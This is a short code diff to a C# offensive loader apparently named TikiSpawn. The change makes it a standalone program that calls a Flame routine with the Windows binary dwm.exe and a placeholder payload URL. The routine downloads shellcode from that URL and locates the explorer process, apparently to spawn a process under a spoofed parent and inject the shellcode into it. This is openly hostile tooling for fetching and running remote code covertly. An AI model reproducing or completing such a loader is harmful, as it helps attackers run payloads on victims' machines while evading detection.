@@ -8,9 +8,9 @@ using TikiLoader;
 public class TikiSpawn
 {
 
-    public TikiSpawn()
+    public static void Main()
     {
-        Flame(@"", @"");
+        TikiSpawn.Flame(@"C:\\Windows\\System32\\dwm.exe", @"http://host/payload");
     }
 
     private static byte[] GetShellcode(string url)
@@ -40,7 +40,7 @@ public class TikiSpawn
 
     }
 
-    private void Flame(string binary, string url)
+    private static void Flame(string binary, string url)
     {
         byte[] shellcode = GetShellcode(url);
         int ppid = FindProcessPid("explorer");
